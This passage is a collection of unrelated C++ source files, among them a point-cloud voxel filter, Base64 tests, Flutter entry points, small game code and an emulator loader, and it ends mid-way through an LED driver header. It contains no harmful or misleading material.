    "#include <iostream>\n#include <string>\n#include <pcl/io/ply_io.h>\n#include <pcl/point_types.h>\n#include <pcl/filters/voxel_grid.h>\n#include <pcl/visualization/pcl_visualizer.h>\n#include <pcl/common/common.h> // For pcl::getMinMax3D\n\ntypedef pcl::PointXYZ PointT;\ntypedef pcl::PointCloud<PointT> PointCloudT;\n\n\nint main(int argc, char* argv[])\n{\n  PointCloudT::Ptr cloud(new PointCloudT);\n  PointCloudT::Ptr cloud_filtered(new PointCloudT);\n  PointCloudT::Ptr cloud_Clean(new PointCloudT);\n\n\n  if(argc < 2)\n     {\n         PCL_ERROR(\"The file.ply is missing : Provide one ply file.\\n!\");\n         return(-1);\n     }\n\n\n  if (pcl::io::loadPLYFile(argv[1], *cloud) < 0)\n  {\n    PCL_ERROR(\"Error loading cloud %s.\\n\", argv[1]);\n    return(-1);\n  }\n\n  // V\u00e9rification si le nuage est vide\n    if (cloud->points.empty()) {\n        std::cerr << \"Point cloud is empty!\" << std::endl;\n        return -1;\n    }\n  std::cerr << \"Cloud before filtering: \" << std::endl;\n  std::cerr << *cloud << std::endl;\n\n\n  // V\u00e9rification si des points contiennent des valeurs NaN\n  for (const auto& point : cloud->points) {\n      if (std::isnan(point.x) || std::isnan(point.y) || std::isnan(point.z)) {\n          //std::cerr << \"Point contains NaN value!\" << std::endl;\n          continue;\n      }\n      cloud_Clean->points.push_back(point);\n  }\n  std::cerr << \"Deleting all Points containing NaN value!\" << std::endl;\n\n    // Si aucun point valide n'a \u00e9t\u00e9 trouv\u00e9\n    if (cloud_Clean->points.empty()) {\n        std::cerr << \"No valid points after filtering!\" << std::endl;\n        return -1;\n    }\n  // Calcul de la bounding box (bo\u00eete englobante)\n    PointT min_pt, max_pt;\n    pcl::getMinMax3D(*cloud_Clean, min_pt, max_pt);\n\n    int downsampling_factor = 2;\n\n    downsampling_factor = atoi(argv[2]);\n  // Calcul des dimensions du nuage (largeur, hauteur, profondeur)\n    float width = max_pt.x - min_pt.x;\n    float height = max_pt.y - min_pt.y;\n    float depth = max_pt.z - min_pt.z;\n    // Affichage des dimensions\n    std::cout << \"Bounding box dimensions: \" << std::endl;\n    std::cout << \"Width: \" << width << std::endl;\n    std::cout << \"Height: \" << height << std::endl;\n    std::cout << \"Depth: \" << depth << std::endl;\n  // Calcul de la taille du voxel en fonction de la taille du nuage\n    float voxel_size = std::min(width, std::min(height, depth)) / (100 / downsampling_factor); // Taille de voxel proportionnelle \u00e0 la plus petite dimension\n\n  // Create the filtering object\n  pcl::VoxelGrid<PointT> sor;\n  sor.setInputCloud(cloud_Clean);\n  sor.setLeafSize(voxel_size, voxel_size, voxel_size);\n  sor.filter(*cloud_filtered);\n\n\n  std::cerr << \"PointCloud after filtering: \" << cloud_filtered->width * cloud_filtered->height\n\n       << \" data points (\" << pcl::getFieldsList (*cloud_filtered) << \").\" << std::endl;\n\n  pcl::visualization::PCLVisualizer viewer(\"Voxel Grid\");\n  // Create two vertically separated viewports\n  int v1(0);\n  int v2(1);\n  viewer.createViewPort(0.0, 0.0, 0.5, 1.0, v1);\n  viewer.createViewPort(0.5, 0.0, 1.0, 1.0, v2);\n  // The color we will be using\n  float bckgr_gray_level = 0.0;  // Black\n  float txt_gray_lvl = 1.0 - bckgr_gray_level;\n\n  // Original point cloud is white\n  pcl::visualization::PointCloudColorHandlerCustom<PointT> cloud_color_h(cloud_Clean, (int)255*txt_gray_lvl,\n                                          (int)255*txt_gray_lvl, (int)255*txt_gray_lvl);\n  viewer.addPointCloud(cloud_Clean, cloud_color_h, \"cloud_v1\", v1);\n\n  // downSampling point cloud is green\n  pcl::visualization::PointCloudColorHandlerCustom<PointT> cloud_tr_color_h(cloud_filtered, 20, 180, 20);\n  viewer.addPointCloud(cloud_filtered, cloud_tr_color_h, \"cloud_v2\", v2);\n\n  // Adding text descriptions in each viewport\n  viewer.addText(\" Original Points\", 10, 15, 16, txt_gray_lvl, txt_gray_lvl, txt_gray_lvl, \"Info_1\", v1);\n  viewer.addText(\" Down Sampling Points\", 10, 15, 16, txt_gray_lvl, txt_gray_lvl, txt_gray_lvl, \"Info_2\", v2);\n\n  // Set background color\n  viewer.setBackgroundColor(bckgr_gray_level, bckgr_gray_level, bckgr_gray_level, v1);\n  viewer.setBackgroundColor(bckgr_gray_level, bckgr_gray_level, bckgr_gray_level, v2);\n\n  // Set camera position and orientation\n  viewer.setCameraPosition(-3.68332, 2.94092, 5.71266, 0.289847, 0.921947, -0.256907, 0);\n  viewer.setSize(1280, 1024);  // Visualiser window size\n\n  while(!viewer.wasStopped())\n    {\n      viewer.spinOnce();\n    }\n\n  return (0);\n\n}\n",
    "\ufeff#include <iostream>\n#include <algorithm>\n\ntemplate <typename T>\nclass SimpleVector\n{\npublic:\n\t// \uae30\ubcf8 \uc0dd\uc131\uc790: \ucd08\uae30 \uc6a9\ub7c9\uc740 10\n\tSimpleVector() : currentSize(0), currentCapacity(10)\n\t{\n\t\tdata = new T[currentCapacity];\n\t}\n\n\tSimpleVector(int capacity = 10) : currentSize(0), currentCapacity(capacity)\n\t{\n\t\tdata = new T[currentCapacity];\n\t}\n\n\tSimpleVector(const SimpleVector& other) : currentSize(other.currentSize), currentCapacity(other.currentCapacity)\n\t{\n\t\tdata = new T[currentCapacity];\n\t\tfor (int i = 0; i < currentSize; ++i)\n\t\t{\n\t\t\tdata[i] = other.data[i];\n\t\t}\n\t}\n\n\t~SimpleVector()\n\t{\n\t\tdelete[] data;\n\t}\n\n\n\tvoid push_back(const T& value)\n\t{\n\t\tif (currentSize >= currentCapacity)\n\t\t{\n\t\t\t// \uc6a9\ub7c9\uc774 \uac00\ub4dd \ucc3c\uc73c\uba74 5\ub9cc\ud07c \ub298\ub9b0\ub2e4\n\t\t\tresize(currentCapacity + 5);\n\t\t}\n\t\tdata[currentSize] = value;\n\t\tcurrentSize++;\n\t}\n\n\tvoid pop_back()\n\t{\n\t\tif (currentSize > 0)\n\t\t{\n\t\t\tcurrentSize--;\n\t\t}\n\t}\n\n\tvoid resize(int newCapacity)\n\t{\n\t\tif (newCapacity <= currentSize)\n\t\t{\n\t\t\treturn;\n\t\t}\n\n\t\tT* newData = new T[newCapacity];\n\n\t\tfor (int i = 0; i < currentSize; ++i)\n\t\t{\n\t\t\tnewData[i] = data[i];\n\t\t}\n\n\t\tdelete[] data;\n\n\t\tdata = newData;\n\t\tcurrentCapacity = newCapacity;\n\t}\n\n\tvoid sortData()\n\t{\n\t\tstd::sort(data, data + currentSize);\n\t}\n\n\tint size() const\n\t{\n\t\treturn currentSize;\n\t}\n\n\tint capacity() const\n\t{\n\t\treturn currentCapacity;\n\t}\n\nprivate:\n\tT* data;            \n\tint currentSize;    \n\tint currentCapacity;\n};\n",
    "#include \"pch.h\"\n#include <Base-Conversion.h>\n\n\n\n\nTEST(Base64, HelloWorld) {\n\n\tconst char* zString = \"Hello, World!\";\n\n\n\n\tconst char* zBase64 = \"SGVsbG8sIFdvcmxkIQ==\";\n\n\tEXPECT_EQ(sec::toBase64(zString), std::string_view(zBase64));\n\n\tEXPECT_EQ(sec::toBase64url(zString), std::string_view(zBase64));\n}\n\nTEST(Base64, OneLetterEncode)\n{\n\tconst char* zString = \"z\";\n\n\tconst char* zBase64 = \"eg==\";\n\n\tEXPECT_EQ(sec::toBase64(zString), std::string_view(zBase64));\n\n\tEXPECT_EQ(sec::toBase64url(zString), std::string_view(zBase64));\n}\n\nTEST(Base64, TwoLetterEncode)\n{\n\tconst char* zString = \"yz\";\n\n\tconst char* zBase64 = \"eXo=\";\n\n\tEXPECT_EQ(sec::toBase64(zString), std::string_view(zBase64));\n\n\tEXPECT_EQ(sec::toBase64url(zString), std::string_view(zBase64));\n}\n\nTEST(Base64, ThreeLetterEncode)\n{\n\tconst char* zString = \"xyz\";\n\n\tconst char* zBase64 = \"eHl6\"; // Calculated from already existing tool.\n\n\tEXPECT_EQ(sec::toBase64(zString), std::string_view(zBase64));\n\n\tEXPECT_EQ(sec::toBase64url(zString), std::string_view(zBase64));\n}",
    "#include \"GameManager.h\"\n\nvoid GameManager::tick() {\n  // if there is no game state in the stack, then do nothing\n  if(top == nullptr || top->gameState == nullptr) {\n    return;\n  }\n\n  // propagate the tick to the current state\n  top->gameState->tick();\n}\n\nvoid GameManager::draw() {\n  // if there is no game state in the stack, then do nothing\n  if(top == nullptr || top->gameState == nullptr) {\n    return;\n  }\n\n  // propagate the draw to the current state\n  top->gameState->draw();\n}\n\nvoid GameManager::pushState(GameState *gameState) {\n  // if we are pushing a null pointer don't do anything cuz that'd be stupid\n  if(gameState == nullptr) {\n    return;\n  }\n\n  // if there is already a state active, then close it\n  if(this->top != nullptr && this->top->gameState != nullptr) {\n    this->top->gameState->close();\n  }\n\n  // create a new node and set it to the top\n  this->top = new GameStateNode(gameState, this->top);\n\n  // open the new game state\n  gameState->open();\n}\n\nvoid GameManager::popState() {\n  // if there is nothing on the stack don't do anything\n  if(this->top == nullptr) {\n    return;\n  }\n\n  // get the node to be removed\n  GameStateNode *removeGameState = this->top;\n\n  // if it has a valid game state, then close it as we are removing it\n  if(removeGameState->gameState != nullptr) {\n    removeGameState->gameState->close();\n  }\n\n  // set the top to be the next game state in the list\n  this->top = removeGameState->next;\n\n  // if there was another game state in the stack and is valid, then open it\n  if(this->top != nullptr && this->top->gameState != nullptr) {\n    this->top->gameState->open();\n  }\n\n  // delete the previous top game state set to be remove\n  delete removeGameState;\n}\n\nGameManager::~GameManager() {\n  while(this->top != nullptr) {\n    popState();\n  }\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"calculator\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"repetated_background_audio_player\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\r\n#include <vector>\r\n#include <string>\r\nusing namespace std;\r\nstring Preorder(vector<int>node, int idx)\r\n{\r\n\tif (idx < node.size())\r\n\t{\r\n\t\tstring ret = to_string(node[idx]) + \" \";\r\n\t\tret += Preorder(node, 2 * idx + 1);\r\n\t\tret += Preorder(node, 2 * idx + 2);\r\n\t\treturn ret;\r\n\t}\r\n\treturn \"\";\r\n}\r\nstring Inorder(vector<int>node, int idx)\r\n{\r\n\tif (idx < node.size())\r\n\t{\r\n\t\tstring ret = Inorder(node, 2 * idx + 1);\r\n\t\tret += to_string(node[idx]) + \" \";\r\n\t\tret += Inorder(node, 2 * idx + 2);\r\n\t\treturn ret;\r\n\t}\r\n\treturn \"\";\r\n}\r\nstring Postorder(vector<int>node, int idx)\r\n{\r\n\tif (idx < node.size())\r\n\t{\r\n\t\tstring ret = Inorder(node, 2 * idx + 1);\r\n\t\tret += Inorder(node, 2 * idx + 2);\r\n\t\tret += to_string(node[idx]) + \" \";\r\n\t\treturn ret;\r\n\t}\r\n\treturn \"\";\r\n}\r\nvector<string> Solution(vector<int>& node)\r\n{\r\n\tvector<string>result(3);\r\n\tstring Preordr = Preorder(node, 0);\r\n\tstring Inordr = Inorder(node, 0);\r\n\tstring Postordr = Postorder(node, 0);\r\n\tPreordr.pop_back();\r\n\tInordr.pop_back();\r\n\tPostordr.pop_back();\r\n\tresult.push_back(Preordr);\r\n\tresult.push_back(Inordr);\r\n\tresult.push_back(Postordr);\r\n\treturn result;\r\n}\r\nint main(void)\r\n{\r\n\tint count;\r\n\tcin >> count;\r\n\tvector<int>node(count);\r\n\tfor (int i = 0; i < count; i++)\r\n\t{\r\n\t\tcin >> node[i];\r\n\t}\r\n\tvector<string>answer = Solution(node);\r\n\tfor (const string& temp : answer)\r\n\t{\r\n\t\tcout << temp << endl;\r\n\t}\r\n\treturn 0;\r\n}",
    "/*\n *   Copyright (c) 2025 Jawaid Bazyar\n\n *   This program is free software: you can redistribute it and/or modify\n *   it under the terms of the GNU General Public License as published by\n *   the Free Software Foundation, either version 3 of the License, or\n *   (at your option) any later version.\n\n *   This program is distributed in the hope that it will be useful,\n *   but WITHOUT ANY WARRANTY; without even the implied warranty of\n *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n *   GNU General Public License for more details.\n\n *   You should have received a copy of the GNU General Public License\n *   along with this program.  If not, see <https://www.gnu.org/licenses/>.\n */\n\n#include <iostream>\n#include <cstdio>\n\n#include \"gs2.hpp\"\n#include \"cpu.hpp\"\n#include \"memory.hpp\"\n#include \"loader.hpp\"\n\nchar *loader_filename = NULL;\nuint16_t loader_address = 0x0000;\n\nvoid loader_set_file_info(char *filename, uint16_t address) {\n    loader_filename = filename;\n    loader_address = address;\n}\n\nvoid loader_execute(cpu_state *cpu) {\n\n    if (loader_filename == NULL) {\n        fprintf(stderr, \"Loader filename not set\\n\");\n        return;\n    }\n\n    FILE* file = fopen(loader_filename, \"rb\");\n    if (file == NULL) {\n        fprintf(stderr, \"Failed to open file %s\\n\", loader_filename);\n        return;\n    }\n\n    // Get file size\n    fseek(file, 0, SEEK_END);\n    long file_size = ftell(file);\n    fseek(file, 0, SEEK_SET);\n\n    // Read file into buffer\n    uint8_t *memory_chunk = (uint8_t *)malloc(file_size);\n    if (memory_chunk == NULL) {\n        fprintf(stderr, \"Failed to allocate memory for file %s\\n\", loader_filename);\n        fclose(file);\n        return;\n    }\n\n    fread(memory_chunk, 1, file_size, file);\n    fclose(file);\n\n    // Load into RAM at loader_address\n    for (long i = 0; i < file_size; i++) {\n        raw_memory_write(&CPUs[0], loader_address + i, memory_chunk[i]);\n    }\n\n    free(memory_chunk);\n}",
    "#include \"plot.h\"\n#include \"backend.h\"\n#include \"config.h\"\n#include <fstream>\n#include <iostream>\n#include <sstream>\n#include <regex>\n\nplot::plot(){\n    basehtml=\"\";\n}\n\nplot::plot(std::string basehtml){\n    this->basehtml=basehtml;\n}\n\nvoid plot::setBaseHtml(std::string basehtml){\n    this->basehtml=basehtml;\n}\n\nstd::string plot::loadhtml(std::string path){\n    std::ifstream in(path);\n    std::istreambuf_iterator<char> beg(in), end;\n    std::string html(beg, end);\n    return html;\n}\n\nstd::string plot::applydata(CalcResult result,std::string filename,bool isSave){\n    std::stringstream ss;\n    ss <<\"x = \"             << Backend::ArrayToStringNumber(result.frames,result.length)    << \";\"      << std::endl;\n    ss <<\"  y = \"           << Backend::ArrayToStringNumber(result.bitrates,result.length)  << \";\"      << std::endl;\n    ss <<\"  pts = \"         << Backend::ArrayToStringNumber(result.pts,result.length)       << \";\"      << std::endl;\n    ss <<\"  pict_type = \"   << Backend::ArrayToStringChar(result.pict_type,result.length)   << \";\"      << std::endl;\n    ss <<\"  key = \"         << Backend::ArrayToStringNumber(result.key,result.length)       << \";\"      << std::endl;\n    ss <<\"  pkt_size = \"    << Backend::ArrayToStringNumber(result.pkt_size,result.length)  << \";\"      << std::endl;\n    ss <<\"  avg = \"         << result.avg                                                   << \";\"      << std::endl;\n    ss <<\"  length = \"      << result.length                                                << \";\"      << std::endl;\n    ss <<\"  name = \\\"\"      << filename                                                     << \"\\\";\"    << std::endl;\n    ss <<\"  codec = \\\"\"     << result.codec                                                 << \"\\\";\"    << std::endl;\n    ss <<\"  fpsNum = \"      << result.fpsNum                                                << \";\"      << std::endl;\n    ss <<\"  fpsDen = \"      << result.fpsDen                                                << \";\"      << std::endl;\n\n    std::string res=plot::templateReplace(basehtml,ss.str(),\"datas\");\n    if (isSave){\n        res=plot::templateReplace(res,\"true\",\"isSave\");\n        res=plot::templateReplace(res,ONLINE_ECHARTS,\"echarts\");\n    }\n    else{\n        res=plot::templateReplace(res,\"false\",\"isSave\");\n        res=plot::templateReplace(res,\"../\"+std::string(OFFLINE_ECHARTS),\"echarts\");\n    }\n    return res;\n}\n\nvoid plot::savehtml(std::string path,std::string html){\n    std::ofstream file;\n    file.open(path);\n    file << html;\n    file.close();\n};\n\ninline std::string plot::templateReplace(std::string base,std::string data,std::string templ){\n    std::regex expr(\"\\\\{\\\\{\\\\{\"+templ+\"\\\\}\\\\}\\\\}\");\n    return std::regex_replace(base, expr, data);\n}\n",
    "/* -------------------------------------------------------------------------*\\\n *\n *  NEOS\n *\n *  -------------------------------------------------------------------------\n *  License\n *  This file is part of Neos.\n *\n *  Neos is free software: you can redistribute it and/or modify it\n *  under the terms of the GNU Lesser General Public License v3 (LGPL)\n *  as published by the Free Software Foundation.\n *\n *  Neos is distributed in the hope that it will be useful, but WITHOUT\n *  ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or\n *  FITNESS FOR A PARTICULAR PURPOSE. See the GNU Lesser General Public\n *  License for more details.\n *\n *  You should have received a copy of the GNU Lesser General Public License\n *  along with Neos. If not, see <http://www.gnu.org/licenses/>.\n *\n\\*---------------------------------------------------------------------------*/\n/* -------------------------------------------------------------------------*\\\nsudo docker run -it -v $(pwd):/builds/workspace neos\n\\*---------------------------------------------------------------------------*/\n\n\n#include \"include.hpp\"\n\n#include \"export.hpp\"\n#include \"transport.hpp\"\n\n\nint main(int argc, char **argv) {\n    Neos_Init(&argc, &argv);\n    int i(0);\n\n    // Create struct and class pointer\n    Data            data(atoi(argv[argc - 3]), atoi(argv[argc - 2]), atoi(argv[argc - 1]));\n    Grid            *grid = new Grid(data.xmin, data.ymin, 0.0, data.l, data.l / std::pow(2, data.level), data.dim);\n    ASphere         *geo  = new ASphere(-0.5, 0, 0, 0.0, 2);\n    TransportScheme *trpt = new TransportScheme(&data, grid, geo);\n\n    // Initial pos\n    trpt->initializePhi();\n    exportResults(grid, trpt->getPhi(), data.solName, i);\n\n    // Loop across the scheme\n    while(trpt->getT() < 1.0) {\n        i++;\n        trpt->computePhi();\n        if (i%10==0) {\n            exportResults(grid, trpt->getPhi(), data.solName, i/10);\n            exportResults(grid, trpt->getPhiExact(), data.solNameExacte, i/10);\n        }\n    }\n\n    std::cout << \"CFL: \" << data.u[0] * data.dt / data.h << std::endl;\n    std::cout << \"Erreur: \" << computeError(grid, trpt->getPhi(), trpt->getPhiExact()) << std::endl;\n    \n    delete trpt;\n    delete grid;\n    delete geo;\n    \n    Neos_Finalize();\n\n    return 0;\n}\n\n\n",
    "\ufeff#include \"TextScrollActor.h\"\n#include \"Engine/Engine.h\"\n#include \"Game/Game.h\"\n\nTextScrollActor::TextScrollActor(const char* message)\n{\n    // \ubb38\uc790\uc5f4 \uae38\uc774 \uad6c\ud558\uae30.\n    length = (int)strlen(message);\n\n    // \ubb38\uc790\uc5f4 \ubcf5\uc0ac.\n    string = new char[length + 1];\n    strcpy_s(string, length + 1, message);\n\n    temp = new char[printWidth + 1];\n\n    // \ucee4\uac70 \uac10\ucd94\uae30\n    Engine::Get().SetCursorType(CursorType::NoCursor);\n}\n\nTextScrollActor::~TextScrollActor()\n{\n    delete[] string;\n    delete[] temp;\n}\n\nvoid TextScrollActor::Update(float deltaTime)\n{\n    // ESC \uc885\ub8cc.\n    if (Engine::Get().GetKeyDown(VK_ESCAPE))\n    {\n        //Engine::Get().QuitGame();\n        Game::Get().ToggleMenu();\n    }\n    \n    // \uc88c\uc6b0 \ubc29\ud5a5\ud0a4 \uc785\ub825 \ucc98\ub9ac.\n    if (Engine::Get().GetKey(VK_LEFT))\n    {\n        // \ubc29\ud5a5 \uc124\uc815.\n        direction = Direction::Left;\n        shouldUpdate = true;\n    }\n\n    if (Engine::Get().GetKey(VK_RIGHT))\n    {\n        // \ubc29\ud5a5 \uc124\uc815.\n        direction = Direction::Right;\n        shouldUpdate = true;\n    }\n\n    // \ubc29\ud5a5\ud0a4\uac00 \uc548 \ub20c\ub838\ub294\uc9c0 \ud655\uc778.\n    if (!Engine::Get().GetKey(VK_LEFT) && !Engine::Get().GetKey(VK_RIGHT))\n    {\n        shouldUpdate = false;\n    }\n\n    // \ub51c\ub808\uc774 \uacc4\uc0b0.\n    elapsedTime += deltaTime;\n    // \uc2dc\uac04\uc774 \ubaa8\ub450 \uacbd\uacfc\ud588\ub294\uc9c0 \ud655\uc778.\n    if (elapsedTime < delayTime)\n    {\n        return;\n    }\n\n    // \uc2dc\uac04\uc774 \uacbd\uacfc \ud588\uc73c\uba74 \ub2e4\uc74c \uacc4\uc0b0\uc744 \uc704\ud574 \ucd08\uae30\ud654.\n    elapsedTime = 0.0f;\n\n    if (shouldUpdate)\n    {\n        if (direction == Direction::Right)\n        {\n            // \ud654\uba74\uc5d0 \uadf8\ub9b4 \ubb38\uc790\uc5f4\uc758 \uc2dc\uc791 \uc778\ub371\uc2a4 \uc5c5\ub370\uc774\ud2b8.\n            index = (index - 1 + length) % length;\n        }\n\n        else if (direction == Direction::Left)\n        {\n            // \ud654\uba74\uc5d0 \uadf8\ub9b4 \ubb38\uc790\uc5f4\uc758 \uc2dc\uc791 \uc778\ub371\uc2a4 \uc5c5\ub370\uc774\ud2b8.\n            index = (index + 1) % length;\n        }\n    }\n}\n\nvoid TextScrollActor::Draw()\n{\n    // \uc784\uc2dc \ubb38\uc790\uc5f4 \ubc84\ud37c.\n    //char* temp = new char[printWidth + 1];\n    int tempIndex = index;\n\n    for (int ix = 0; ix < printWidth; ++ix)\n    {\n        temp[ix] = string[tempIndex];\n        tempIndex = (tempIndex + 1) % length;\n    }\n\n    temp[printWidth] = '\\0';\n    Log(temp);\n\n    //delete[] temp;\n    Engine::Get().SetCursorPosition(0, 0);\n}\n",
    "#include <iostream> \n/* Preprocessor Directive, the line above will be processed before compliation. \n   The io part of iostream stands for input/output and is part of the C++ standard library. It allows us to deal with basic input and output.\n*/\n\nint main() // The name of a function is called an 'identifier'\n{\n   std::cout << \"Hello world!\"; \n   \n   /* Statements must end with a ;\n      cout stands for \"character output\".\n      << is known as the insertion operator. It sends bytes to an output stream object. \n   */\n\n   int x {5}; // This is known as direct-list-intialization and is the preferred form.\n\n   std::cout << \"Hello\" << \" world!\"; // The insertion operator can be used to concatenate multiple pieces of output.\n\n   std::cout << \"x is equal to: \" << x;\n\n   /* Unlike in python, separate output statements don't result in separate lines of output on the console.\n      Therefore we need to output a newline. One way to do this is using std::endl\n   */\n\n   std::cout << \"Hi!\" << std::endl; // std::endl will cause the cursor to move to the next line\n   std::cout << \"My name is Prince.\" << std::endl;\n\n   /* One downside to std::endl is that it causes the buffer to flush which is slow. (Remember that std::cout is buffered like a toilet)\n      It's more efficient to let C++ to self-flush and hence we can use '\\n' to create a new line.\n   */\n\n   std::cout << \"x is equal to: \" << x << '\\n'; // single quoted (by itself) (conventional)\n   \n   return 0; // Returning 0 indicates that the function worked properly \n}\n",
    "#include \"../limited_queue.h\"\r\n#include \"gtest/gtest.h\"\r\n\r\nusing namespace vnn;\r\n\r\nTEST( limited_queue_tests, main )\r\n{\r\n\t// simple test for limited size with drop\r\n\t{\r\n\t\tconst size_t limit = 10;\r\n\t\tLimitedQueue< int > queue( limit, true, std::chrono::microseconds( 1000 ) );\r\n\t\tfor( int i = 0; i < limit; ++i )\r\n\t\t\tEXPECT_TRUE( queue.push_back( i ) );\r\n\t\tfor( int i = limit; i < 2 * limit; ++i )\r\n\t\t\tEXPECT_FALSE( queue.push_back( i ) );\r\n\r\n\t\tEXPECT_EQ( queue.size(), limit );\r\n\r\n\t\tfor( int i = limit; i < 2 * limit; ++i )\r\n\t\t{\r\n\t\t\tint j;\r\n\t\t\tEXPECT_TRUE( queue.pop_front( j ) );\r\n\t\t\tEXPECT_EQ( i, j );\r\n\t\t}\r\n\t}\r\n\r\n\t// simple test for limited size with no drop\r\n\t{\r\n\t\tconst size_t limit = 10;\r\n\t\tLimitedQueue< int > queue( limit, false, std::chrono::microseconds( 1000 ) );\r\n\t\tfor( int i = 0; i < limit; ++i )\r\n\t\t\tEXPECT_TRUE( queue.push_back( i ) );\r\n\r\n\t\tEXPECT_FALSE( queue.push_back( limit + 1 ) );\r\n\t\tEXPECT_EQ( queue.size(), limit );\r\n\r\n\t\tfor( int i = 0; i < limit; ++i )\r\n\t\t{\r\n\t\t\tint j;\r\n\t\t\tEXPECT_TRUE( queue.pop_front( j ) );\r\n\t\t\tEXPECT_EQ( i, j );\r\n\t\t}\r\n\t}\r\n}\r\n",
    "\n#include \"Ghost.h\"\n\nGhost::Ghost(SDL_Rect moveSquare, GameMap* gameMap) {\n\n\tmInput = InputManager::Instance();\n\n\tmGhost = new Texture(\"PMSpriteSheet.png\");\n\tmGhost->ClipLocalTexture(489, 0, 13, 15);;\n\n\tmMoveSquare = moveSquare;\n\tmGameMap = gameMap;\n\n\tCurrentPositionOnGrid = 99;\n\n\tstartTicks = SDL_GetTicks();\n\telapsedTicks = 0;\n\tdeltaTime = 0.0f;\n\n\tmMoveSpeed = 4.0;\n\t\n\tmPacManTile = 29;\n\tpathToPacMan = mGameMap->BFS(99, mPacManTile);\n\n\tmIt = 0;\n\n\tmIsMoving = false;\n}\n\nGhost::~Ghost() {\n\n\tmInput = NULL;\n\n\tdelete mGhost;\n\tmGhost = NULL;\n\n\tmGameMap = NULL;\n}\n\nvoid Ghost::Move() {\n\n\telapsedTicks = SDL_GetTicks() - startTicks;\n\tdeltaTime = elapsedTicks * 0.001f;\n\tif (mIsMoving) {\n\t\t//moving in the positive direction: down or right\n\t\tif (mGhost->mTextureArea.x - mTargetTileX == 0 &&\n\t\t\tmGhost->mTextureArea.y - mTargetTileY == 0) {\n\n\t\t\tmIsMoving = false;\n\t\t\tCurrentPositionOnGrid = pathToPacMan[mIt];\n\t\t}\n\t}\n\n\tif (mIsMoving)\n\t\tmGhost->LerpTextureArea(mGameMap->mGrid->mTiles[pathToPacMan[mIt - 1]].mTile.x, mGameMap->mGrid->mTiles[pathToPacMan[mIt - 1]].mTile.y, mTargetTileX, mTargetTileY, deltaTime, mMoveSpeed);\n}\n\nvoid Ghost::Update() {\n\n\tif (CurrentPositionOnGrid != pathToPacMan[pathToPacMan.size() - 1]) {\n\n\t\tif (mIsMoving == false) {\n\n\t\t\tmIt++;\n\t\t\tmIsMoving = true;\n\t\t\tmTargetTileX = mGameMap->mGrid->mTiles[pathToPacMan[mIt]].mTile.x;\n\t\t\tmTargetTileY = mGameMap->mGrid->mTiles[pathToPacMan[mIt]].mTile.y;\n\t\t\tstartTicks = SDL_GetTicks();\n\t\t\telapsedTicks = 0;\n\t\t\tdeltaTime = 0.0f;\n\t\t}\n\t\telse\n\t\t\tMove();\n\t}\n\n\tif (mIsMoving == false && pathToPacMan[pathToPacMan.size() - 1] != mPacManTile) {\n\n\t\tmIt = 0;\n\t\tpathToPacMan = mGameMap->BFS(CurrentPositionOnGrid, mPacManTile);\n\t}\n}\n\n//\nvoid Ghost::Render() {\n\n\tmGhost->Render();\n}",
    "#include <cinttypes>\n#include \"lp586x.h\"\n\n#include \"esphome/core/helpers.h\"\n#include \"esphome/core/log.h\"\n\n#include <esp_attr.h>\n\n/***************************************************************************//**\n *Register Address\n ******************************************************************************/\n/* Device Configuration Register Address*/\n#define Chip_Enable_Register               0x000\n#define Device_Initial_Register            0x001\n#define Device_Configuration_1_Register    0x002\n#define Device_Configuration_2_Register    0x003\n#define Device_Configuration_3_Register    0x004\n\n#define LED_Group_Selection_Register_start 0x00C //Register address from 0x009 to 0x042\n#define LED_Dot_Onoff_Register_start       0x043 //Register address from 0x043 to 0x063\n\n/* Current Configuration Register Address */\n#define Color_Group_R_Current_Register     0x009\n#define Color_Group_G_Current_Register     0x00A\n#define Color_Group_B_Current_Register     0x00B\n#define LED_Dot_Current_Register_Start     0x100 //Register address from 0x100 to 0x1C5\n\n/* Brightness Configuration Register Address */\n#define Master_Brightness_Register         0x005\n#define 